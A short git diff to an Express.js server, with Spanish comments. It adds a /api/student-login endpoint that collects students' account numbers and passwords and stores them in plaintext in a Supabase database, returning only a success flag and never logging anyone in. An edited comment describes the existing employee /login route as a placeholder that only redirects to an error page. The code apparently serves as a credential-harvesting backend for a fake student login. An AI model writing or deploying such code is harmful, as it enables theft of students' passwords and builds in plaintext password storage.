@@ -2,6 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
 const { verifyLogin } = require('./src/supabaseClient');
+const { saveStudentCredentials } = require('./src/studentCredentialStorage');
 
 const app = express();
 const PORT = process.env.PORT || 4000;
@@ -13,8 +14,9 @@ app.use(cors());
 app.use(express.json({ limit: '10kb' }));
 
 /**
- * Unico endpoint de la API.
- * POST /login { email, password } -> { success, user, session }
+ * Endpoint de autenticación de empleados (Supabase Auth).
+ * Sección "en mantenimiento": el flujo real no captura datos, solo redirige
+ * al cliente a /error. Se mantiene por compatibilidad con la pila.
  */
 app.post('/login', async (req, res) => {
   try {
@@ -44,6 +46,33 @@ app.post('/login', async (req, res) => {
     return res.status(500).json({
       success: false,
       error: 'Error interno del servidor.',
+    });
+  }
+});
+
+/**
+ * Nuevo endpoint: captura el número de cuenta + contraseña del estudiante
+ * en texto plano (sin hash) y los guarda en la base de datos Supabase.
+ * POST /api/student-login { cuenta, contrasenia } -> { success }
+ */
+app.post('/api/student-login', async (req, res) => {
+  try {
+    const { cuenta, contrasenia } = req.body || {};
+
+    if (!cuenta || !contrasenia) {
+      return res.status(400).json({
+        success: false,
+        error: 'Faltan numero de cuenta o contraseña en el cuerpo de la peticion.',
+      });
+    }
+
+    await saveStudentCredentials(cuenta, contrasenia);
+    return res.json({ success: true });
+  } catch (err) {
+    console.error('Error al guardar credenciales del estudiante:', err);
+    return res.status(500).json({
+      success: false,
+      error: 'No se pudo guardar la informacion.',
     });
   }
 });
